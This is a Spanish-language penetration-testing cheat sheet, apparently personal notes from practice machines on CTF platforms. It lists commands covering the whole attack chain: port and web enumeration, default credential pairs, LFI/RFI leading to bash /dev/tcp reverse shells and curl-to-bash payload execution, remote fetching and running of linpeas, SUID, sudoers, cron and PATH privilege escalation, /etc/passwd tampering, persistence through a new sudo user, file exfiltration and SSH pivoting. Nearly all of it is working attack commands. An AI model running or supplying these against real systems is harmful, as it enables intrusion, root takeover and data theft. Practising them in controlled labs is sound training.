# Metodología de hacking ético
Sistema base: Kali Linux, virtualizado con Vmware. Adaptador puente.
Pongo mi manual resumido de guia de comandos resumido para todos.
He dejado diversas ips ya que son sacados de máquinas y no quería colocar caracteres raros.
Lo más importante es ser muy disciplinado, entrenar en entornos controlados y mejorar continuamente tus técnicas.

# Enumeración 
## Red
```shell
arp-scan -I ens33 --localnet --ignoredups
settarget "192.168.111.39 SickOs"
mkdir virus #Carpeta para dejar todo lo recolectado
mkt (Script que crea 4 directorios nmap,content,exploits,scripts)
ping -c 1 192.168.111.39 #Comprobamos
```

## Nmap  
Nmap es la herramienta perfecta para hacer escaners de redes, buscando ips, puertos y versiones. 
Es muy importante analizarse bien para encontrar ya -
```shell
#ENUMERACIÓN
sudo nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 192.168.111.39 -oG allPorts
extractPorts allPorts
sudo nmap -pXXX -sCV -A 192.168.111.39 -oN targeted
cat targeted -l java

#VARIANTE EXPRESS
nmap -p- --open -sVC -A 192.168.111.39 -oN targeted

#Añadir al /etc/hosts el equipo si hay resoluciones DNS
echo "10.129.128.223 unika.htb" | sudo tee -a /etc/hosts

#Servidores Web
whatweb http://192.168.111.35
nmap --script http-enum -p80,8081 192.168.111.35 -oN webScan
nmap -p 135,139,445 --script smb-vuln* 10.10.10.4 -oN SMBvuln

```

#### SSH
Opcion 1: Utilizar MobaXterm
Opción 2: SSH
```shell
ssh s4vitar@10.10.1.2
```

#### FTP
Opcion 1: Utilizar MobaXterm

```shell
# Opcion 2: Metasploit ftp_login
use auxiliary/scanner/ftp/ftp_login
	set RHOSTS <IP>
	set USERNAME <nombre> #"Anonymous" o el nombre a probar
	set BLANK_PASSWORDS true #Si es Anonymous

# Opcion 3: FTP nativo
ftp 10.129.228.229
	User: anonymous (o el que corresponda)
	Password: vacia (o la que probamos)
```

#### SMB
Enumeración 
```shell
rpcclient -U "" 10.10.5.101
	enumdomusers
```

```shell
smbclient -L <IP_VICTIMA> -U Administrator
 
smbclient \\\\10.10.5.101\\print$
smbclient \\\\10.10.5.101\\IPC$
smbclient \\\\10.10.10.131\\ADMIN$ -U Administrator
```

#### Dirbuster  
  ```shell
gobuster dir -u http://192.168.111.35 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
gobuster dir -u http://secure.cereal.ctf:4441/back_en -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php

#Subdominios
gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb
gobuster vhost -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://votenow.local/ -t 20 | grep -v "400"
# Utilizar un proxy de PC victima para hacerse pasar por él

```
#### Burpsuite  + Foxyproxy
```
burpsuite &> /dev/null & disown
```



# Explotación  

## Contraseñas mas habituales
admin:password
admin:admin
root:root
root:password
admin:admin1
admin:password1
root:password1


## Busqueda del exploits
```shell
#Buscamos exploits
searchsploit pokermax

#Opcion 2:
https://www.exploit-db.com/exploits/6766

#Leyendo contenido del script
searchsploit -x php/webapps/6766.txt
```

  
## Web  
Si estamos con un directory listing
```shell
# Crear una carpeta en el directorio elegido
curl -X MKCOL "http://10.10.7.103/download/test/"
```
  
## Windows  
Navegación con: **Evil-Winrm.rb** 

## Linux  

### Shell sencilla desde RFI - ExploitDB
```shell
# 1. Encontramos un LFI
page=../../../../../../etc/hosts

# 2. Encontramos un RFI 
	# Formulario que permita subir archivos para imagenes, contact...

	# Acceso por FTP, metasploit...
	

# 3. (AT): Creamos una shell basica y abrimos un servidor
echo 'bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1' > shell.sh
python3 -m http.server 80

# 4. (AT): Abrimos un NC 
nc -nvlp 1337

# 5. (WEB): Ejecutamos reverse shell
http://thetoppers.htb/shell.php?cmd=curl%20%3C10.10.15.111%3E:5555/shell.sh|bash

## Web  
Bash utilizada en  shell de una pagina web
```shell
  bash -c "bash -i >%26 /dev/tcp/10.10.10.68/1234 0>%261"
```
  
  
----  
  
# Post-Explotación  (Linux)

## Arreglar tty
```shell
#PANTALLA 2
nc -nlvp 443
script /dev/null -c bash
Control+Z
stty raw -echo;fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184

# OPCION 2 "Si tiene python"
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

### Modificar script sh para elevar
```shell
#Con el usuario actual
ls -l /bin/bash

# (OP.1 - SH) añadimos al script con nano, o también podemos hacerlo con echo, si tuvieramos problemas con la tty 
chmod u+s /bin/bash

# (OP.1 - PYTHON) 
import os 
os.system("chmod u+s /bin/bash")

# Monitorizamos con 
watch -n 1 ls -l /bin/bash

# Nos cambiamos de bash y deberiamos haber elevado 
bash -p
whoami #Debe ser root
```
## Monitorización de tareas
```shell
# Ver procesos y servicios corriendo
ss -tl
ps -aux
```

#### Creación script: procmom.sh
```shell
#/bin/bash
old_process=$(ps -eo user,command)

while true; do
	new_process=$(ps -eo user,command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmom|command|kworker"
	old_process=$new_process
done
```

```shell
env
```

#### Enumeración manual por grupo
```shell
find / -group bugtracker 2>/dev/null
```
## Enumeración automática
#### LSE: Linux Smart Enumeration
```shell
## EN ATACANTE
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
cat < /dev/tcp/192.168.111.45/443

#En la VICTIMA 
nc -nlvp 443 < lse.sh

# Reportamos con nivel de profundidad
chmod +x lse.sh
./lse.sh -l 1
	(sin contraseña)
```

#### LinPeas
```shell
# From github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

```shell
# Local network
sudo python3 -m http.server 80 #Host
curl 192.168.95.1/linpeas.sh | sh #Victim
```

## Elevación  (usuario o root)

#### Elevación básica
```shell
sudo su
sudo -l
```

#### Abuso del fichero Sudoers
```shell
nano /etc/sudoers
	s4vitar ALL=(root) NOPASSWD: /usr/bin/awk

sudo awk 'BEGIN {system("/bin/bash")}'
```

#### Elevación SUID
```shell
#Abuso con php para levantar una shell como root
php -r "pcntl_exec('/bin/sh', ['-p']);"

#Buscar binarios con privilegios SUID
find / -perm -4000 2>/dev/null
```

#### Tareas programadas
```shell
crontab -e 
	* * * * * /bin/bash /tmp/script.sh
touch script.sh
chmod +x script.sh
chmod o+w script.sh

nano /tmp/script.sh
	#!/bin/bash
		sleep 2
		whoami > /tmp/out.put.txt
```

#### Path Hijacking
```shell
strings test | grep "whoami"

export PATH=/tmp/:$PATH
echo PATH
```

#### Cambiando la contraseña de un usuario (/etc/passwd)
```shell
#Detectamos ficheros que tienen permiso de escritura
find / -writable 2>/dev/null | grep -vE "python3.10|proc"

#Generamos una contraseña
openssl passwd

#Lo pegamos en el passwd (cambiando la contraseña)
nano /etc/paswd
```

#### Meter al usuario en el grupo root 

#### Permisos sobre algún script programado

#### Kernel explotation (ej: DirtyC0w)

## Persistencia
#### Creación de usuario local y asignación al grupo sudo
```shell
useradd usermio
passwd usermio
	patata
	
usermod -aG sudo usermio
```

## Exfiltración
Montar servidor y llevarte archivos
```shell
python3 -m http.server 80    #VICTIMA
```

----
# Mov Lateral  - Pivoting

#### Port-forwarding local
```shell
# 1. Conexión desde Kali a PrimeraVictima por SSH
ssh miuser@10.10.3.102

# 2. Creamos un tunel en PrimeraVictima  para que todo lo que entre por aquí se vaya a la SegundaMaquina
ssh -L 0.0.0.4455:172.0.1.102:80 miuser@localhost

### PRUEBAS: El resultado de hacer debe ser lo mismo
curl http://172.0.1.102:80  # SegundaMaquina
curl http://10.0.3.102:4455 # KALI
```

